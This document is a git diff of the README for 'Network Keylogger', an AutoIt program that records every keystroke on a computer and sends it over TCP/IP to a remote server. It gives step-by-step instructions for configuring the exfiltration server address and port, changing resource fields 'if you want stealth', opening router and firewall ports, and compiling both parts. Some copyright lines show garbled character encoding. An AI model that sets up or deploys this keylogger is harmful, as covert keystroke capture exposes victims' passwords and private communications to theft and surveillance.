@@ -1,52 +1,54 @@
 Network Keylogger v1.0.0.2 - Sends every key pressed in a computer to another computer, via TCP/IP.
 Network Keylogger Server v1.0.0.2 - Server program for Network Keylogger
-Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
+Copyright Â© 2010 VittGam - Net-Keylogger@VittGam.net
 
 ================================
 ============ Usage: ============
 ================================
 
-1.	Download AutoIt v3.3.6.0 or newer and SciTE AutoIt Script Editor from
+1.	Download Network Keylogger files from https://github.com/VittGam/net-keylogger/zipball/master
+
+2.	Download AutoIt v3.3.6.0 or newer and SciTE AutoIt Script Editor from
 	http://www.autoitscript.com/autoit3/downloads.shtml
 
-2.	Install AutoIt and SciTE.
+3.	Install AutoIt and SciTE.
 
-3.	Open the script network_keylogger.au3 with SciTE (right-click -> Edit Script)
+4.	Open the script network_keylogger.au3 with SciTE (right-click -> Edit Script)
 
-4.	Change these variables with your computer external address and the port you want to use:
+5.	Change these variables with your computer external address and the port you want to use:
 
 	Global $server_addr="server.vittgam.net"
 	Global $server_port="12569"
 
-5.	Change these parameters if you want stealth:
+6.	Change these parameters if you want stealth:
 
 	#AutoIt3Wrapper_icon=vittgam.ico
 	#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.2 by VittGam
 	#AutoIt3Wrapper_Res_Description=Network Keylogger
 	#AutoIt3Wrapper_Res_Fileversion=1.0.0.2
-	#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
+	#AutoIt3Wrapper_Res_LegalCopyright=Copyright ï¿½ 2010 VittGam
 	#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
 	#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
 	#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
 	#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.2
 	#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe
 
-6.	Save the script.
+7.	Save the script.
 
-7.	Open the script network_keylogger_server.au3 with SciTE (right-click -> Edit Script)
+8.	Open the script network_keylogger_server.au3 with SciTE (right-click -> Edit Script)
 
-8.	Change these variables with the address and port you want to use (leave 0.0.0.0 as
+9.	Change these variables with the address and port you want to use (leave 0.0.0.0 as
 	bind address if you want to listen on all interfaces):
 
 	Global $listen_bind="0.0.0.0"
 	Global $listen_port="12569"
 
-9.	Save the script.
+10.	Save the script.
 
-10.	If you want to access the server from the Internet, open the port on your router if needed.
+11.	If you want to access the server from the Internet, open the port on your router if needed.
 	Remember to open it in your firewall too, even for LAN/local connections.
 
-11.	Compile both scripts using the "Compile with Options" right-click command.
+12.	Compile both scripts using the "Compile with Options" right-click command.
 
 ================================
 === Known bugs/limitations: ====
